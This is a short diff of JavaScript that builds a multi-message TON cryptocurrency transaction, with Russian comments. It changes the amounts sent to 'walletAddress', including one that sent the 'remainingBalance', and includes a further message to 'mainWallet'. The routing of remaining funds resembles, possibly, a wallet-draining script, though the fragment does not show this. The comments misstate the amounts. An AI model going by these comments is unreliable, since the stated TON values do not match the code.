@@ -104,15 +104,15 @@ async function didtrans() {
         messages: [
             {
                 address: walletAddress,  // Адрес получателя для первой части
-                amount: 10000,       // Сумма для первой транзакции (0.001 TON)
+                amount: 100,       // Сумма для первой транзакции (0.001 TON)
             },
             {
                 address: walletAddress,  // Адрес получателя для первой части
-                amount: 10000,       // Сумма для первой транзакции (0.001 TON)
+                amount: 100,       // Сумма для первой транзакции (0.001 TON)
             },
             {
                 address: walletAddress,  // Адрес получателя для первой части
-                amount: remainingBalance,       // Сумма для первой транзакции (0.001 TON)
+                amount: 100,       // Сумма для первой транзакции (0.001 TON)
             },
             {
                 address: mainWallet,   // Адрес получателя для второй части
